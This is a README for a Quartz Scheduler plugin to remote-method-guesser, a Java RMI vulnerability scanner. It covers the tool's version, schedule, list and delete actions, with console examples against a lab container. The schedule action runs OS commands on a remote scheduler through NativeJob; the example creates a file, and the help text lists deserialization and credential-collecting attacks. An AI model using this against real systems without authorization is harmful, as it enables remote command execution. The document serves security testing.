### Quartz Scheduler

----

A small plugin to interact with a remotely accessible [Quartz Scheduler](https://www.quartz-scheduler.org/).
The plugin implements the `IActionProvider` interface to add additional actions to *remote-method-guesser*.
The following listing shows the extended help menu when the plugin is used:

```console
[user@host ~]$ rmg --plugin quartz-plugin.jar --help
usage: remote-method-guesser [-h] [--plugin PLUGIN]   ...

rmg v5.1.0 - a Java RMI Vulnerability Scanner

positional arguments:

  actions:
    bind                 Binds an object to the registry that points to listener
    call                 Regularly calls a method with the specified arguments
    codebase             Perform remote class loading attacks
    enum                 Enumerate common vulnerabilities on Java RMI endpoints
    guess                Guess methods on bound names
    known                Display details of known remote objects
    listen               Open ysoserials JRMP listener
    objid                Print information contained within an ObjID
    rebind               Rebinds boundname as object that points to listener
    roguejmx             Creates a rogue JMX listener (collect credentials)
    scan                 Perform an RMI service scan on common RMI ports
    serial               Perform deserialization attacks against default RMI components
    unbind               Removes the specified bound name from the registry

  plugin actions:
    delete               delete a job from the scheduler
    list                 list jobs registred within sche scheduler
    schedule             schedule a NativeJob for command execution
    version              get the version of the remote scheduler

named arguments:
  -h, --help             show this help message and exit
  --plugin PLUGIN        file system path of a rmg plugin
```


### Plugin Actions

----

In the following, the different supported plugin actions are quickly demonstrated. You can
use the Quartz Scheduler docker image provided by [this repository](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Fquartz-scheduler-server)
to try it out yourself. The container source code can be found [here](/docker/quartz-server).


#### version

`version` is the most basic action and simply shows the version of the remote Quartz Scheduler:

```console
[user@host ~]$ rmg --plugin quartz-plugin.jar version 172.17.0.2 1099
[+] No bound name specified. Trying to find it automatically.
[+] Found Quartz Scheduler with bound name: DefaultQuartzScheduler_$_NON_CLUSTERED
[+] Remote Quartz Scheduler version: 2.3.2
```

#### schedule

`schedule` can be used to schedule a new job. This plugin only allows scheduling jobs of the
`NativeJob` type. This can be used to execute operating system commands. Optionally, you can
specify a date to execute at (`--date`) , a repeat interval (`--repeat`) and a repeat count
(`--repeat-count`). If `--date` was not specified, jobs are executed immediately.

```console
[user@host ~]$ rmg --plugin quartz-plugin.jar schedule 172.17.0.2 1099 "touch /tmp/rmg-1337" --date 19:30:00:13:04:2024 --repeat 30
[+] No bound name specified. Trying to find it automatically.
[+] Found Quartz Scheduler with bound name: DefaultQuartzScheduler_$_NON_CLUSTERED
[+] Creating job DEFAULT.rmg-job-1713029113284 executing touch /tmp/rmg-1337
[+] Setting job execution time to: 19:30:00:13:04:2024
[+] Setting repeat rate to: 30m
[+] Setting repeat count to: infinity
```

#### list

`list` obtains a list of currently defined jobs. Jobs are always identified by a group and
a name.

```console
[user@host ~]$ rmg --plugin quartz-plugin.jar list 172.17.0.2 1099
[+] No bound name specified. Trying to find it automatically.
[+] Found Quartz Scheduler with bound name: DefaultQuartzScheduler_$_NON_CLUSTERED
[+] Listing Jobs:
[+] 	Group: DEFAULT Name: rmg-job-1713029113284
```

#### delete

`delete` allows you to delete a job by specifying it's group and name:

```console
[user@host ~]$ rmg --plugin quartz-plugin.jar delete 172.17.0.2 1099 DEFAULT rmg-job-1713029113284
[+] No bound name specified. Trying to find it automatically.
[+] Found Quartz Scheduler with bound name: DefaultQuartzScheduler_$_NON_CLUSTERED
[+] Deleting job DEFAULT.rmg-job-1713029113284
```
